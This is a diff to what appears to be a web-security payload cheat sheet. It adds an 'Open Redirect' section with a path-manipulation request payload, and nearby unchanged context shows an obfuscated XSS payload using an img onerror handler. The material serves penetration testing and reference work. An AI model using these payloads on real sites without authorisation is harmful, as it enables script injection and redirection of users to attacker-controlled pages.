@@ -116,6 +116,7 @@
       <li><a href="#xxe-injection">XXE injection</a></li>
       <li><a href="#cors">CORS exploitation</a></li>
       <li><a href="#websocket">WebSocket</a></li>
+      <li><a href="#open-redirect">Open Redirect</a></li>
     </ul>
   </li>
   <li>
@@ -2007,6 +2008,11 @@ Content-Length: 52<br><br>
 <h3 id="websocket">WebSocket</h3>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#obfuscated XSS payload
 &lt;img src=1 oNeRrOr=alert`1`&gt;
+</code></pre></div></div>
+
+<h3 id="open-redirect">Open Redirect</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#
+GET /normalPath//example.com/%2F..
 </code></pre></div></div>
 
 <h2 id="email">Email sending checklist (inquiry)</h2>
